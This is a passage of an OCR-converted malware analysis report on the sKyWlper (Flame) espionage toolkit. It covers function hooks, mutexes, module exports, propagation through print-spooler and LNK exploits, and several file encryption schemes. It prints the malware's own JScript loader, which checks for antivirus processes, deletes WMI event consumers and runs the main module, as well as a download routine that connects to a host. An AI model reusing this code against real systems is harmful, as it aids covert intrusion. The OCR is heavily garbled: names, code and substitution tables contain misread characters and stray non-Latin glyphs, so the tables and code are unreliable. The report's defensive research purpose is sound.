| Name<br>Value<br>Type<br>SSDT<br>ZwClose [0xF60028C6]<br>{??\C:\WINDOWS\system32\Drivers\PROCMON20.SYS<br>SSDT<br>\??\C:\WINDOWS\system32\Drivers\PROCMON20.SYS<br>ZwCreateKey [0xF60026BC]<br>SSDT<br>\??\C:\WINDOWS\system32\Drivers\PROCMON20.SYS<br>ZwDeleteKey [0xF6002564]<br>\??\C:\WINDOWS\\system32\Drivers\PROCMON20.SYS<br>SSDT<br>ZwDeleteValueKey [0xF60025AA<br>SSDT<br>\??\C:\WINDOWS\system32\Drivers\PROCMON20.SYS<br>ZwEnumerateKey [0xF60024AA]<br>SSDT<br>{??\C:\WINDOWS\system32\Drivers\PROCMON20.SYS<br>ZwEnumerateValueKey [0xF6002406]<br>SSDT<br>{??\C:\WINDOWS\system32\Drivers\PROCMON20.SYS<br>ZwFlushKey [0xF60024FE]<br>SSDT<br>{??\C:\WINDOWS\system32\Drivers\PROCMON20.SYS<br>ZwLoadKey [0xF6002A2A]<br>SSDT<br>\??\C:\WINDOWS\system32\Drivers\PROCMON20.SYS<br>ZwOpenKey [0xF6002888]<br>SSDT<br>{??\C:\WINDOWS\system32\Drivers\PROCMON20.SYS<br>ZwQueryKey [0xF60020F6]<br>SSDT<br>\??\C:\WINDOWS\system32\Drivers\PROCMON20.SYS<br>ZwQueryValueKey [0xF600221E]<br>SSDT<br>??\C:\WINDOWS\system32\Drivers\PROCMON20.SYS<br>ZwSetValueKey [0xF6002342]<br>SSDT<br>\??\C:\WINDOWS\system32\Drivers\PROCMON20.SYS<br>ZwUnloadKey [0xF6002B7A]<br>2<br>C:\WINDOWS\system32\Drivers\PROCMON20.SYS<br>The system cannot find the file specifi<br>C:\WINDOWS\system32\Drivers\PROCEXP113.SYS<br>The system cannot find the file specifi<br>C:\WINDOWS\system32\Drivers\RKREVEAL150.SYS<br>The system cannot find the file specifi<br>C:\WINDOW'S \Explorer.EXE\1616\SHELL32.dll/SHGelSpecialFolderPathW + E0 7CSEF858 7 Byles JMP 0185041C<br>text<br>AttachedDevi<br>{FileSystem\Fastfat \Fat<br>fitmar.sys [Microsoft Filesystem Filter | V System<br>V Sections<br>V IAT/EAT<br>><br>Devices<br>V Modules<br>V Processes<br>V Threads<br>Libraries<br>V Services<br>V Registry<br>V Files<br>v C:V<br>V ADS |
|                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | Show all<br>Stop                                                                                                                                                   |
|                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | Copy                                                                                                                                                               |
| C:\Python27\tcl\tk8.5\demos\anilabel.tcl                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | Save                                                                                                                                                               |

Figure 10 – Hooking shell32 dll's SHGetSpecialFolderPathW function in explorer.exe

![](_page_19_Figure_6.jpeg)

### 3.5. Mutexes

Similarly to other malicious codes, sKyWlper uses mutexes to make sure that only one instance is running from it. Mutexes are created either for injected system processes (winlogon.exe, services.exe, explorer.exe) and proprietary files. In the former case, the following naming convention is used: TH POOL SHD PQOISNG #PID#SYNCMTX, where the #PID# variable refers to the PID of the system process the mutex belongs to. Furthermore, there are other mutexes that belongs to files created by the malcode. These are the following.

c\_program\_files\_common\_files\_microsoft shared\_msaudio\_wpgfilter.dat

c program files common files microsoft shared msaudio audcache

To reveal all the mutexes one can traverse Windows' \_KMUTANT data structure, however, it is difficult to grasp the malicious ones.

| Functions window     | 国 区     | 23                           Hex View-A         Structures |           |         |  |
|----------------------|---------|------------------------------------------------------------|-----------|---------|--|
| Function name        | SE<br>A | Name                                                       | Address   | Ordinal |  |
| 19 unknown_libname_1 | .te     | :EnableSHH                                                 | 111118481 |         |  |
| 1) sub_1000102B      | .te     | DisableSHR                                                 | 10008544  |         |  |
| 10 sub_10001054      | .te     | GetSML                                                     | 10008942  | 3       |  |
| 1) sub_10001077      | .te     | CreateABHList                                              | 10008444  | 4       |  |
| DIMain(x,x,x)        | . te    | FreeABHData                                                | 10008489  | 5       |  |
| 10 sub_1000112B      | .te     | EnableDLV                                                  | 10003D71  | 6       |  |
| 19 sub_10001135      | .te     | DisableDLV                                                 | 10003E10  |         |  |
| 1) sub_10001201      | .te     | Ha RestoreSMLData                                          | 10004048  | 8       |  |
| 19 sub_1000129D      | te      | 掛 WriteVBInfo                                              | 10006534  | 9       |  |
| 10 sub_100012A7      | .te     | 盘 ReadVBInfo                                               | 1000657D  | 10      |  |
| 10 sub_1000132F      | .te     | EnableOFR                                                  | 10008106  |         |  |
| 1) sub_10001339      | .te     | DisableOFR                                                 | 10008359  | 12      |  |
| 10 sub_10001429      | .te     | 辑 GetWPF                                                   | 1000B603  | 13      |  |
| 19 sub_10001516      | .te     | CreatePGHDict                                              | 10008794  | 14      |  |
| 1) sub_10001520      | .te     | 盘 DIEntryPoint                                             | 1004D0DB  |         |  |
| Shoub 10001553       | 10      |                                                            |           |         |  |

## 3.6. nteps32 exports

Figure 11 – nteps32 [loaded many times] exported functions – lot of functionality

![](_page_20_Picture_8.jpeg)

It would be useful to describe here the exact meaning of the abbreviated functionality (SHR, ABH, BHD, DLV, SMLData, VBinfo, OFR, PF, PGHDict) of this interesting library, however, currently we do not have enough information on it.

CreatePGHDict might be associated with some Bluetooth related activities.

EnableSHR might be connected to ~DEB93D creation which contains samba nmb name resolution traffic log.

## 3.7. Installation and propagation method

There are multiple ways for the malware to propagate. One method we are aware of is related to windows update and file downloading by some modules using SSL and some proprietary text based protocol. We also have clear indications that Stuxnet's print spooler exploit (MS10-061) and lnk exploit (MS10-046) is used within sKyWlper as well:

```
var objFileSystem = new ActiveXObject("Scripting.FileSystemObject");var s =
GetObject("winmgmts:root\\cimv2");var oProcs = s.ExecQuery("SELECT * FROM
Win32 Process WHERE name='outpost.exe' or name='aupdrun.exe' or name='op mon.exe'
or
name='avp.exe'");s.Delete("__EventFilter.Name="FilterForClassCreation"");s.Delete("
ActiveScriptEventConsumer.Name="ActiveScriptForSvc"];s.Delete("MyTestClass");s.Del
ete("  Win32Provider.Name='ActiveScriptEventConsumer'");var f =
objFileSystem.GetFile("wbem\\mof\\good\\svchostevt.mof");f.Delete(true);
f =objFileSystem.GetFile("testpage");f.Delete(true);if (!oProcs.Count) { s1 = new
ActiveXObject("Wscript.Shell");s1.Run("%SYSTEMROOT%\\system32\\rundl132.exe
msdclr64.ocx,DDEnumCallback");while (true) {  var oProcs = s.ExecQuery("SELECT *
FROM Min32_Process WHERE name='rundl132.exe'"); if (!oProcs.Count) break; } var f =
objFileSystem.GetFile("msdclr64.ocx");f.Delete(true);} else {  var f =
objFileSystem.GetFile("msdclr64.ocx"); f.Delete(true);}
```
where msdclr64.ocx refers to the main module

Figure 12 – Printer problem related routines in the malware

URL :

 am=55XXXXXXXXX55X&ef=962DXXXTEC84XXXXEC84&pr=1&ec=0&ov=66664XXXXX64174&pl=qs pndXXXXXXX | spnZXXX | nyXXX | 0nXXX | TWvXXXX | nGcXXX...

some 30-50 tags more XXX are deliberately deleted

Figure 13 – URL used to download mssecmgr.sys by some installation part

![](_page_21_Picture_12.jpeg)

Figure 13 shows the URL used to download the main module by some routine in the installation part of the malware. The routine downloads the file mssecmgr.ocx and some header: B5 A0 44 3F 67 EA EA E5 B2 EA EA. Trying to decrypt the header with algorithm E1 (see encryption algorithms later in this report) and considering OxEA => 0x00, the result is

: 0000000000: 20 E1 D7 50 0A 00 00 00 | C8 OF 00 00 á×P◙ Č☆

Further information shows that this is related to the windows update mechanism and the MUNCH attack (see later). Numbers are partially removed or overwritten with X for privacy.

```
("
CreateSection("$windir\softwaredistribution\selfupdate\default\wuauinfo.ocx");
CreateSection("$windir\softwaredistribution\selfupdate\default\wuauinfo.ocx");"
```
Another sample (numbers are removed or modified) is the following:

```
connect(10.55.55.55,80,6);
UrlDetect("
?1<number removed>","");
```
The user agent during this communications is set to "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.2150)". This cannot be found by a google search; hence, it is possibly used by the malware for identification purposes. For the same reason, it can possibly be used as a NIDS signature.

![](_page_22_Picture_7.jpeg)

## 4. Description of components

Now we present our initial analysis of the files used in sKyWlper. Note that given the lack of resources and time, our findings are preliminary. The main goal is to highlight the structure of the malware modules and the techniques used by the authors (e.g., for encryption); and to pave the way for a thorough investigation.

## 4.1. Encryption algorithms

At the time of this writing, we identified five encryption algorithms used in the malware, we refer to them as E1-E5. E1 is used in DAT files. For E1, we managed to produce a full substitution table as presented in Figure 14 below. We could identify the encryption algorithms E2-E5 shown in subsequent figures, but we do not have a full understanding of where they are used in sKyWlper and if they are related to known encryption methods.

| 0  | 234   | 34     | 183 | ୧୫    | 196  |     | 102 | 87    | 136    | 19   | 170 | 129   |
|----|-------|--------|-----|-------|------|-----|-----|-------|--------|------|-----|-------|
| 1  | 130   | 35     | 248 | ୧ ବି  | 179  | 103 |     | 71    | 137    | 27   | 171 | 170   |
| 2  | ਰੇ ਰੇ | 36     | 157 | 70    | 127  | 104 |     | 162   | 138    | 251  | 172 | ਕੇ ਪੈ |
| 3  | 174   | 37     | 31  | 71    | 176  | 105 |     | 230   | 139    | 50   | 173 | 58    |
| 4  | 163   | 3 8    | 226 | 72    | 36   | 106 |     | 225   | 140    | 131  | 174 | O     |
| 5  | 140   | 3 ฿    | 47  | 78    | 128  | 107 |     | 79    | 141    | 120  | 175 | 167   |
| 6  | 102   | 4 0    | 145 | 74    | 113  |     | 108 | 169   | 142    | 90   | 176 | 209   |
| 7  | 73    | 41     | 67  | 75    | 10   | 109 |     | 206   | 143    | 97   | 177 | 195   |
| 8  | 243   | 42     | 111 | 76    | 48   | 110 |     | 198   | 144    | 154  | 178 | 161   |
| ி  | 1     | 4 B    | 191 | 77    | 150  | 111 |     | 218   | 145    | 136  | 179 | 112   |
| 10 | 103   | 4 4    | 175 | 78    | 118  | 11  | 2   | 125   | 146    | 80   | 180 | 244   |
| 11 | 6     | 4 है   | 159 | 79    | 106  | 1   | 3   | 43    | 147    | 35   | 181 | 155   |
| 12 | 18    | 4 6    | 250 | 80    | 63   | 11  | 4   | 83    | 148    | 184  | 182 | 119   |
| 13 | 199   | 47     | 166 | 81    | 122  | 11  | 5   | 216   | 149    | 64   | 183 | 197   |
| 14 | 182   | 48     | 205 | 82    | 137  | 11  | 6   | 40    | 150    | 252  | 184 | 201   |
| 15 | 178   | ರ್ ಶಿ  | 95  | 8 8   | 33   | 11  | 17  | 75    | 151    | 39   | 185 | 158   |
| 16 | 7     | 50     | 81  | 84    | 151  | 118 |     | 123   | 152    | 247  | 186 | 121   |
| 17 | 239   | 51     | 96  | 85    | 207  |     | 119 | 37    | 153    | 66   | 187 | 109   |
| 18 | 28    | 52     | 101 | 8 5   | 55   | 120 |     | 222   | 1 \$ 4 | 104  | 188 | 15    |
| 19 | 193   | 53     | 143 | 87    | 242  | 121 |     | 236   | 155    | 203  | 189 | 200   |
| 20 | 117   | 54     | 255 | 8 ฿   | 223  |     | 122 | 29    | 156    | 8 4  | 190 | 173   |
| 21 | 253   | 5 \$   | 249 | 89    | 52   |     | 123 | 156   | 157    | 86   | 191 | 76    |
| 22 | 23    | 5<br>6 | 187 | 90    | 190  | 124 |     | 164   | 158    | ி    | 192 | 60    |
| 23 | 62    | 57     | 153 | 91    | 5 ਭੇ |     | 125 | 139   | 159    | 186  | 193 | 92    |
| 24 | 224   | 5 \$   | 77  | ರಿ ಶ  | 20   |     | 126 | 110   | 160    | ਧੇ 9 | 194 | 65    |
| 25 | 254   | 5 9    | 8 9 | ರಿ B  | 11   | 127 |     | 85    | 161    | 138  | 195 | 133   |
| 26 | 61    | 60     | 241 | 94    | 238  | 128 |     | 142   | 162    | 212  | 196 | 88    |
| 27 | 202   | 61     | 105 | 9 \$  | 16   | 129 |     | 57    | 163    | 24   | 197 | 219   |
| 28 | 30    | 62     | 116 | ರಿ ನ  | ব    | 130 |     | ਰੇ ਤੇ | 164    | 213  | 198 | 141   |
| 29 | 221   | 63     | 208 | 9 t   | 17   |     | 181 | 7 4   | 165    | 91   | 199 | 98    |
| 30 | 26    | 64     | 46  | ರಿ ಕಿ | 78   | 132 |     | 56    | 166    | 228  | 200 | 229   |
| 31 | 149   | 65     | 240 | ರಿ ಶಿ | 70   | 133 |     | 168   | 167    | 172  | 201 | 144   |
| 32 | 181   | ରେ     | 108 | 100   | 134  | 184 |     | 53    | 168    | 2    | 202 | 215   |
| 33 | 192   | 61     | 42  | 101   | 12   |     | 185 | 246   | 169    | 185  | 203 | 14    |

![](_page_23_Picture_5.jpeg)

|     |     | 213 | 188 | 224 | 38  | 235   | 25   | 246 | 152 |  |
|-----|-----|-----|-----|-----|-----|-------|------|-----|-----|--|
| 204 | 204 | 214 | 124 | 225 | 160 | 236   | ਦ ਰੇ | 247 | 220 |  |
| 205 | ന   | 215 | ୧୫  | 226 | 34  | 237   | 211  | 248 | 214 |  |
| 206 | 171 | 216 | 146 | 227 | 100 | 288   | เว   | 249 | 22  |  |
| 207 | 147 | 217 | 126 | 228 | 227 | 2 ฿ 9 | 245  | 250 | 189 |  |
| 208 | 21  | 218 | 210 | 229 | 231 | 240   | 4 5  | 251 | 32  |  |
| 209 | 72  | 219 | 165 | 230 | 177 | 241   | 114  | 252 | 107 |  |
| 210 | 232 | 220 | 235 | 231 | 51  | 242   | ੇ ਪੈ | 253 | 132 |  |
| 211 | 0   | 221 | 180 | 232 | 194 | 243   | 148  | 254 | 82  |  |
| 212 | 41  | 222 | 217 | 233 | 115 | 244   | 233  | 255 | 13  |  |
|     |     | 223 | 54  | 284 | 135 | 245   | 237  |     |     |  |

Figure 14 – Encryption E1 – Substitution table. Left is cleartext, right is ciphertext. Used for DAT files.

```
4091.dll:
unsigned int   cdecl encryptor sub 4025C0(int a1)
【
return (a1 + 11) * (a1 + 17) ^ (((unsigned __int16)((a1 + 11) * (a1 + 17) & 0xFF00)
^ ((((unsigned int)((a1 + 11) * (a1 + 17)) >> 8) ^ (a1 + 11) * (a1 + 17) &
0xFF0000) >> 8)) >> 8);
}
```
Figure 15 – Encryption E2 – found in 4091.dll; loaded as "12Windows Management Instrumentation Configurator" service

```
soapr32.dll:
keygensub_1000C0A2<eax>(int a1<eax>)
{
return (a1 + 11) * (a1 + 17) ^ ((unsigned int)((a1 + 11) * (a1 + 17)) >> 8) ^ (((a1
+ 11) * (a1 + 17) ^ ((unsigned int)((a1 + 11) * (a1 + 17)) >> 8)) >> 16);
}
used as stream cipher with "sub" function:
.text:1000C0C6
                                mov
                                        eax, [esp+8+arg 0]
.text:1000COCA
                                lea
                                        esi, [edi+eax]
.text:1000COCD
                                mov
                                        eax, edi
.text:1000C0CF
                                call
                                        keygensub 1000C0A2; eax->key one d
.text : 1000C0D4
                                sub
                                        [esi], al ; sub the calculated key
.text:1000COD6
                                inc
                                        edi
.text:1000COD7
                                cmp
                                        edi, [esp+8+arg 4]
.text:1000CODB
                                jb
                                        short loc 1000C0C6
```

```
Figure 16 - Encryption E2B - found in soapr32.dll
```

```
unsigned int cipher(unsigned int a1)
イ
return (a1 + 5) * (a1 + 26) ^
((unsigned int)((a1 + 5) * (a1 + 26)) >> 8) ^
(((a1 + 5) * (a1 + 26) ^ ((unsigned int)((a1 + 5) * (a1 + 26)) >> 16);  }
.text:1000E895 sub_1000E895     proc near
                                                      ; CODE XREF:
```
![](_page_24_Picture_7.jpeg)

.text:1000E895 lea есх, [eax+1Ah] .text:1000E898 add eax, 5 .text:1000E89B imul есх, eax .text:1000E89E mov edx, есх .text:1000E8A0 8 shr edx, .text:1000E8A3 mov eax, edx .text:1000E8A5 xor eax, есх .text:1000E8A7 shr 10h eax, .text:1000E8AA xor eax, edx .text:1000E8AC xor eax. есх .text:1000E8AE retn .text:1000E8AE sub 1000E895 endp called as stream cipher in the following way (encryption): .text:1000E8BB loc 1000E8BB: ; CODE XREF: .text:1000E8CE}i .text:1000E8BB mov eax, [ebp+8] .text:1000E8BE lea esi, [edi+eax] .text:1000E8C1 mov eax, edi .text:1000E8C3 call keygen sub 1000E895 -text : 1000F8C8 add [esi], al .text:1000E8CA inc edi .text:1000E8CB cmp edi, [ebp+0Ch] .text:1000E8CE short loc 1000E8BB jb .text:1000E8D0 pop esi .text:1000E8D1 decryption part difference: .text:1000E8ED sub [esi], al (advnetcfg: sub\_1000BD68 ; nteps: sub\_1000E895)

Figure 17 –Encryption E3 – found in advnetcfg and nteps32

```
6411/sub 10003463
v2 = result;
if ( a2 )
(
v3 = 11 - result:
do
(
result = dword 100420B8 + (v3 + v2) * (v3 + v2 + 12);
*(_BYTE *)v2 == result ^ ((unsigned __int16)(((_WORD)dword_100420B8 + (v3 +
( WORD)v2) * (v3 + ( WORD)v2 + 12)) >> 8) ^ ((unsigned int)(dword_100420B8 + (v3 +
v2) * (v3 + v2 + 12)) >> 16) ^ ((unsigned int)(dword 100420B8 + (v3 + v2) * (v3 +
v2 + 12)) >> 24);
++v2;
--a2;
}
```
Figure 18 -Encryption E4 - not clear where it is used

![](_page_25_Picture_4.jpeg)

```
int __usercall sub_1000D9DC<eax>(int result<eax>, int a2<edx>)
{
 int v2; // esi@1
 int v3; // edi@2
 v2 = result;
 if ( a2 )
 (
   v3 = 11 - result;
   do
   {
     result = (v3 + v2) * (v3 + v2 + 6) + 88;
     *(_BYTE *)v2 -= result ^ ((unsigned __int16)(((v3 + (_WORD)v2) * (v3 +
( WORD)v2 + 6) + 88) >> 8) ^ ((unsigned int)((v3 + v2) * (v3 + v2 + 6) + 88) >> 16)
^ ((unsigned int)((v3 + v2) * (v3 + v2 + 6) + 88) >> 24);
     ++v2;
      --a2;
   }
   while ( a2 );
 }
 return result;
```
Figure 19 – Encryption E4B -- found in 4748.dll, possibly used on resource 164

![](_page_26_Picture_2.jpeg)

| 0000000: 4909 caa4 11f3 63f7 2a30 58d8 43eb 3d83                                                     |  |  |  |  |  |  |  |
|------------------------------------------------------------------------------------------------------|--|--|--|--|--|--|--|
| 0000010: 626b 542e d0ca 5f07 599a 07ca 556a f059                                                     |  |  |  |  |  |  |  |
| 0000020: 0d17 b7a2 1c8a 4ac9 bc75 c1e6 30fb 898e                                                     |  |  |  |  |  |  |  |
| 0000030: a8e3 51e2 16bd ea65 02e3 a83b 4555 0a3f                                                     |  |  |  |  |  |  |  |
| 0000040: a6e7 ccfb 19b8 72df 5a57 810a 5cce d1a8                                                     |  |  |  |  |  |  |  |
| 0000050: 5ef8 b871 a07a 9db3 0bcf c786 65d9 100e                                                     |  |  |  |  |  |  |  |
| 0000060: 9d54 3445 f52f d9e1 0b66 b885 d165 lec1                                                     |  |  |  |  |  |  |  |
| 0000070: 0685 0c3a 7cd1 55e1 11db e3b2 5712 41a0                                                     |  |  |  |  |  |  |  |
| 0000080: 836c 1680 054d 852c aec3 1f54 20bf 7ed2                                                     |  |  |  |  |  |  |  |
| 0000090: 7a7c c6f7 220e c0c6 8921 ca51 d0e4 92e6                                                     |  |  |  |  |  |  |  |
| 00000a0: acf4 016c 35ff 79a0 5dac c9ff 7f62 3e9e                                                     |  |  |  |  |  |  |  |
| 00000b0: 070c 629e 9095 11a4 37ef 2b89 0fa5 3df4                                                     |  |  |  |  |  |  |  |
| 00000c0: e0f6 0799 7176 a633 e728 66cb 8826 b714                                                     |  |  |  |  |  |  |  |
| 00000d0: 23dc 0817 9433 e906 d376 16ba 08fa 9841                                                     |  |  |  |  |  |  |  |
| 00000e0: bb6c 82c7 d0d6 4efe a076 a45a 6704 d430                                                     |  |  |  |  |  |  |  |
| 00000f0: 4c64 bff4 d731 cea2 0f7f 3613 9659 b178                                                     |  |  |  |  |  |  |  |
| 0000100: af91 81a2 7325 f22d d3d7 8cb8 ff13 f748                                                     |  |  |  |  |  |  |  |
| 0000110: 9604 41c1 1b19 3d5f 3cc6 e5c2 3635 2731                                                     |  |  |  |  |  |  |  |
| 0000120: dcb9 3c77 9995 38d8 46bc 80d2 f6aa c069                                                     |  |  |  |  |  |  |  |
| 0000130: 0a7b ca91 f2ad 0da2 a45f 966d 7457 9b58                                                     |  |  |  |  |  |  |  |
| 0000140: d78e 6336 d4a3 0d98 a312 23b9 66e3 5a53                                                     |  |  |  |  |  |  |  |
| 0000150: 1134 d01c 1b48 b7e8 8d0b 6a49 c400 27f0                                                     |  |  |  |  |  |  |  |
| 0000160: eef1 fb0e 36ee f395 0277 0bd2 1983 6dfe                                                     |  |  |  |  |  |  |  |
| 0000170: 3666 45fb 98c9 fd5a 300d 7a24 4c46 4861                                                     |  |  |  |  |  |  |  |
| 0000180: c929 09b6 6861 ae81 7a61 2fd0 7121 7c04                                                     |  |  |  |  |  |  |  |
| 0000190: 7809 b5c9 a9d5 670d 9959 1291 58e7 bc54                                                     |  |  |  |  |  |  |  |
| 00001a0: 8111 e1f2 5092 dc54 49b2 622b 7eee a22d                                                     |  |  |  |  |  |  |  |
| 00001b0: bef2 c085 02f6 d4c4 f674 c2de ef1f c626                                                     |  |  |  |  |  |  |  |
| 00001c0: c095 ec9b 2115 d279 6d76 4693 f3c9 41ac                                                     |  |  |  |  |  |  |  |
| 00001d0: a355 1806 0b41 25c8 d853 0579 d404 0bb1                                                     |  |  |  |  |  |  |  |
| 00001e0: 2720 5ab9 755d 2e79 15af 9946 5c42 ea8a                                                     |  |  |  |  |  |  |  |
| 00001f0: e2b8 dd91 7d4c 7c9d f2a7 35a6 09d2 f927                                                     |  |  |  |  |  |  |  |
| 0000200: a826 0a7f d54c 413a af8a 9cb2 4d4e d7c4                                                     |  |  |  |  |  |  |  |
| 0000210: 54b7 ecbb b6ce 5391 62b8 0e59 26e9 671e                                                     |  |  |  |  |  |  |  |
| 0000220; b075 eb6e 6ea3 5a7f 9e66 7d99 4d8c 6184                                                     |  |  |  |  |  |  |  |
| 0000230: 113c 8698 a22c cfb9 2eaf bcf4 fa90 07a3                                                     |  |  |  |  |  |  |  |
| 0000240: 1f17 1217 1115 ac72 031d 380e 1ff5 e374                                                     |  |  |  |  |  |  |  |
| 0000250: 925f 6b71 4831 924d a7dd 2b81 ed45 78f4                                                     |  |  |  |  |  |  |  |
| 0000260: 4385 5ef5 11af 7509 df54 743e c31f 38b3                                                     |  |  |  |  |  |  |  |
| 0000270: afd9 521e a93b ffa6 fd85 c9a6 4ee4 00f6                                                     |  |  |  |  |  |  |  |
|                                                                                                      |  |  |  |  |  |  |  |
| 0000280: 1eb0 9aa3 dfb6 ba3a bd5e 54dd 4ecf 75e7<br>0000290: 9b4c 7d55 cdb5 4e18 b18c 712b d52f 50cd |  |  |  |  |  |  |  |
|                                                                                                      |  |  |  |  |  |  |  |
| 00002a0: f9ec 5f2f bd22 73c9 ea85 3b40 91f6 7079                                                     |  |  |  |  |  |  |  |
| 00002b0: 552c 9252 4614 78a3 8edf d7e1 1f21 5db1                                                     |  |  |  |  |  |  |  |
| 00002c0: 280c 843b a23e 4fbe 862f a7f5 400d a7d1                                                     |  |  |  |  |  |  |  |
| 00002d0: a2c8 b165 b728 21f3 7548 afa3 46e0 3422                                                     |  |  |  |  |  |  |  |
| 00002e0: b49f 76b4 239b 3aa0 6fd4 2d2b d7b0 eaed                                                     |  |  |  |  |  |  |  |
| 00002f0: 1656 2416 5132 721e ccdf 50a1 9862 8252                                                     |  |  |  |  |  |  |  |
| 0000300: b080 88a9 9036 ac52 adbc 789f 4c29 537d                                                     |  |  |  |  |  |  |  |
| 0000310: 5413 debd b867 77d8 966b adc6 8871 a14c                                                     |  |  |  |  |  |  |  |
| 0000320: 16f3 f3c4 f8b6 f47a fde5 d4b6 df5d 3518                                                     |  |  |  |  |  |  |  |

![](_page_27_Figure_1.jpeg)

| 0000330: d9e3 c883 3e30 c885 3dcc 110d 1708 bb4b |  |  |  |  |
|--------------------------------------------------|--|--|--|--|
| 0000340: d85c e180 3e27 e216 3ed9 0c3b d50c 2432 |  |  |  |  |
| 0000350: dc80 76ec clba 4a9f 3419 3482 f2c6 0220 |  |  |  |  |
| 0000360: £004 72e5 83df 5711 4f20 50c6 778d 6af6 |  |  |  |  |
| 0000370: 5063 d245 8987 89a3 0f9a 5f97 be52 459e |  |  |  |  |
| 0000380: bd87 7276 0ca3 2873 597d 61a7 0a80 5475 |  |  |  |  |
| 0000390: 660e c136 6730 f151 7d3b ce5e 968f a227 |  |  |  |  |
| 00003a0: ec52 f10c 475c dbf3 4a86 abad e1d2 22b5 |  |  |  |  |
| 00003b0: c5c3 4cea 347d 063a 27ac cb61 82c5 1822 |  |  |  |  |
| 00003c0: 95c4 211b elbc 4870 7fe7 5e87 laec a435 |  |  |  |  |
| 00003d0; 1bf1 5a9b 0523 2767 93df 0ddb 1247 9509 |  |  |  |  |
| 00003e0: 3801 8437 c626 ffe4 a773 da85 1d61 b45f |  |  |  |  |
| 00003f0: 0630 fa64 264b 7277 d286 6453 5c81 e9e9 |  |  |  |  |
|                                                  |  |  |  |  |

Figure 20 – Encryption E5 -- ~DEB93D encryption key, 1024 byte XOR key used repeatedly

Encryption key E5 might be calculated, but it can also be found in attack tables in memory dumps.

Simple XOR with a constant is also used to "encrypt" files in multiple places. For instance, Boot32drv.sys is an encrypted data file with simple XOR with 0xFF.

to691.tmp is always among the first files that was installed into infected systems. The file contains configuration data and log results, very similar to the audcache.dat, but it is encrypted in a different way, as follows. to691.tmp is encrypted cyclically by XOR-ing with a 16-byte long binary string. The string was found to be individual on the samples. As the cleartext file contains many 0x00 characters, the XOR key can be easily found by statistical means. The method is described in Figure 21 as Encryption E6A.

![](_page_28_Picture_5.jpeg)

```
for i=0..15:
take all characters from file at n*16+i
generate statistics on characters
key[i]=find most common character
for i=0..filesize:
  decrypted[i]=encrypted[i] XOR key[i%16]
```
Figure 21 –Encryption E6A – TO691 1\* stage generic decryption pseudocode

The decrypted text after E6A is still not cleartext database format, but one can easily see that it is very similar to the format of audcache.dat (after decryption).

The second stage is a mono-alphabetical substitution, for which it may not be impossible to find a short mathematical formula to calculate the substitutions, but so far we were not able to find that. Instead, we manually investigated the file and built a partial substitution table on the characters used. The partial table is denoted as E6B in Figure 22.

![](_page_29_Picture_4.jpeg)

| 0   | O    | 34    | 78   | ల్ 8  |       | ବିଦ  | 4 e   | D0  |       |
|-----|------|-------|------|-------|-------|------|-------|-----|-------|
| 1   |      | 35    | 58   | ਦ ਰੇ  |       | 9D   |       | D1  | 5b    |
| 2   |      | 36    |      | 6A    | ਥੋ    | 9 E  | Зе    | D2  |       |
| 3   |      | 37    |      | 6B    |       | 9 F  |       | D3  |       |
| 4   |      | 38    |      | ୧୯    | 64    | A0   |       | D4  |       |
| 5   |      | ਤੇ ਰੇ | ED   | 6D    | 57    | A1   | 75    | D5  | 50    |
| റ   | 79   | 3A    |      | 6 E   |       | A2   |       | D6  |       |
| 7   |      | ЗВ    | B0   | 6 F   |       | A3   |       | D7  |       |
| 8   |      | 3C    |      | 70    |       | A4   | 62    | D8  |       |
| 9   |      | 3D    |      | 71    |       | A5   | 6b    | D9  |       |
| A   |      | 3E    |      | 72    |       | A6   |       | DA  | 4 C   |
| B   | 6a   | 3 F   |      | 73    | 32    | A7   | ਤੇ ਸ  | DB  |       |
| C   | ਦ ਰੇ | 4 0   |      | 7 4   |       | A8   |       | DC  |       |
| D   |      | 41    |      | 75    | 2d    | АЭ   | 7d    | DD  | 5 6   |
| E   |      | 42    |      | 76    |       | AA   |       | DE  | ਦੇ ਰੇ |
| F   |      | 4 ਤੋ  | 6c   | 77    |       | AB   |       | DF  |       |
| 10  | 2e   | 4 4   |      | 78    |       | AC   | ર 3   | EO  | 4 b   |
| 11  |      | 4 5   | 2c   | 79    |       | AD   | 67    | E1  | 5d    |
| 12  |      | 4 6   |      | 7 A   |       | AE   |       | E2  |       |
| 13  | 37   | 47    |      | 7 B   |       | AF   |       | E3  |       |
| 14  |      | 48    | ୧୫   | 7C    | 4 D   | B0   |       | E 4 |       |
| 15  | 36   | ਥੋ    |      | 7 D   | 5 4   | B1   |       | E5  |       |
| 1 6 |      | 4 A   |      | 7 E   |       | B2   |       | E 6 | 65    |
| 17  |      | 4 B   | 2d   | 7 F   |       | B3   |       | E7  | ਸਾ ਦਾ |
| 18  | 57   | 4C    | ೭ ಕ  | 80    | ਰ ਦ   | B4   |       | E8  |       |
| 19  | 55   | 4 D   |      | 81    |       | B5   | 31    | E9  |       |
| 1 A | 41   | 4 E   |      | 82    |       | B6   |       | EA  |       |
| 1 B |      | 4 F   |      | 83    |       | B7   |       | EB  |       |
| 1C  |      | 50    |      | 8 4   | le    | B8   | FF    | EC  |       |
| 1 D |      | 51    | 38   | 85    |       | Ba   | 72    | ED  |       |
| 1 E |      | 52    |      | 8 6   | 42    | BA   |       | EE  |       |
| 1 F |      | 53    |      | 87    |       | BB   | 32    | EF  |       |
| 20  |      | 54    |      | 88    |       | BC   |       | FO  |       |
| 21  |      | 55    |      | 8 9   |       | BD   | 66    | F1  |       |
| 22  |      | 56    |      | 8 A   | 33    | BE   |       | E2  |       |
| 23  |      | 57    |      | 8 B   |       | BF   |       | E3  |       |
| 24  | 6D   | 58    |      | 8C    |       | C0   | ਕੇ ਤੇ | E 4 |       |
| 25  | 55   | ਦੇ ਰੇ | 45   | 8 D   |       | C1   |       | F5  | 25    |
| 26  |      | 5A    | 47   | 8 E   |       | C2   | 74    | E 6 |       |
| 27  | 30   | 5B    |      | 8 F   | ਤੇ ਪੈ | વિરૂ |       | F7  | 7a    |
